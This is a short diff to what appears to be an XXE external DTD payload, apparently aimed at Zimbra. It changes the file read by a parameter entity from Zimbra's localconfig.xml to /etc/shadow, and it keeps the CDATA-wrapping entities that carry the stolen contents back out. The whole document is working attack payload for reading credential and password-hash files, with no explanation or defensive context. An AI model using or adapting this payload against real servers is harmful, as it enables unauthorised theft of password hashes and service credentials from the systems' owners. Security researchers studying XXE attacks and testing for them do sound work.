@@ -1,4 +1,4 @@
-<!ENTITY % file SYSTEM "file:///opt/zimbra/conf/localconfig.xml">
+<!ENTITY % file SYSTEM "file:///etc/shadow">
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % end "]]>">
 <!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
